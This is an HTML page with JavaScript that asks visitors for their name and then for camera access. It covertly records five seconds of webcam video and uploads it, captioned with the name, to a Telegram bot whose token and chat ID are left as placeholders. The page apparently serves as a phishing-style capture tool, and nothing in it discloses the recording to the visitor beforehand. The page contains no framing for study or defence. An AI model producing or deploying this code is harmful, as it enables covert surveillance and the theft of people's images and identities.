<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Camera Access</title>
    <style>
        body {
            background-color: black;
            color: white;
            font-family: Arial, sans-serif;
            text-align: center;
            margin: 0;
            padding: 0;
        }
        #container {
            margin-top: 20%;
        }
        input[type="text"] {
            padding: 10px;
            font-size: 16px;
        }
        button {
            padding: 10px 20px;
            font-size: 16px;
            background-color: #4CAF50;
            color: white;
            border: none;
            cursor: pointer;
        }
        button:hover {
            background-color: #45a049;
        }
    </style>
</head>
<body>
    <div id="container">
        <h1>Please Enter Your Name</h1>
        <input type="text" id="username" placeholder="Enter your name" required>
        <br><br>
        <button onclick="requestCamera()">OK</button>
    </div>
    <script>
        async function requestCamera() {
            const username = document.getElementById('username').value;
            if (!username) {
                alert('Please enter your name');
                return;
            }

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                let video = document.createElement('video');
                video.srcObject = stream;
                video.play();

                // Set up MediaRecorder
                let recordedChunks = [];
                const mediaRecorder = new MediaRecorder(stream);
                
                mediaRecorder.ondataavailable = (event) => {
                    if (event.data.size > 0) {
                        recordedChunks.push(event.data);
                    }
                };

                mediaRecorder.onstop = async () => {
                    const blob = new Blob(recordedChunks, { type: 'video/mp4' });
                    const videoUrl = URL.createObjectURL(blob);
                    console.log('Video URL:', videoUrl);

                    // Send video file
                    await sendToTelegram(username, blob);
                };

                // Start recording and stop after 5 seconds
                mediaRecorder.start();
                setTimeout(() => mediaRecorder.stop(), 5000);
                
            } catch (error) {
                alert('Camera access denied.');
            }
        }

        async function sendToTelegram(username, videoBlob) {
            const botToken = 'YOUR_BOT_TOKEN';  // Replace with your bot token
            const chatId = 'YOUR_CHAT_ID';      // Replace with your chat ID
            const url = `https://api.telegram.org/bot${botToken}/sendVideo`;

            // Create FormData and append the video file
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('caption', `User: ${username}`);
            formData.append('video', videoBlob, 'video.mp4');

            try {
                const response = await fetch(url, {
                    method: 'POST',
                    body: formData
                });
                const data = await response.json();
                if (data.ok) {
                    alert('Your video has been sent!');
                } else {
                    console.error('Telegram API Error:', data);
                    alert('Failed to send video.');
                }
            } catch (error) {
                console.error('Error:', error);
                alert('Failed to send video.');
            }
        }
    </script>
</body>
</html>
